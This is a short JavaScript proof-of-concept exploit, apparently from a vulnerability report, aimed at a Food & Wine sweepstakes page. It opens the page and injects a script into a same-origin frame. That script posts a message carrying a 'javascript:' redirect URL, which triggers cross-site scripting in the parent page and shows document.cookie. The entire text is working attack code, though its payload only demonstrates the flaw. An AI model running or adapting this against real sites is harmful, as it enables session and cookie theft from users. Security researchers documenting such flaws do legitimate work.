const targetWindow = window.open('https://www.local.foodandwine.com:3000/sweepstakes', '_blank');
let interval = setInterval(() => {
    if (targetWindow.closed) {
        clearInterval(interval);
        return;
    }
    const iframe = targetWindow.frames[1];

    if (iframe && iframe.location.origin === window.location.origin) {
        const script = iframe.document.createElement('script');
        script.textContent = `window.parent.postMessage({redirectExternalURL:'javascript:confirm(document.cookie)'},'*')`;
        iframe.document.body.appendChild(script);
        clearInterval(interval);
    }
}, 100);